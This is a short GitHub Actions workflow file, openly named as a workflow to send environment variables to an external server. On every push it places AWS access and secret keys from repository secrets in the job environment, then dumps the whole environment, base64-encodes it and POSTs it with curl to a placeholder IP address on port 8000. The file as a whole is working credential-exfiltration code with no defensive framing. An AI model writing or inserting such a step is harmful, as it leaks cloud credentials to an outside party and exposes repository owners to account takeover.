```
name: Workflow to send env variables to external server
on: push
jobs:
  first-job:
    env:
      AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
      AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}
    runs-on: ubuntu-latest
    steps:
      - name: sleep
        run: sleep 10
      - name: test
        run: test=`env | base64 > test.txt`;curl -X POST http://<IP_Address>:8000/upload --data-binary @test.txt
```
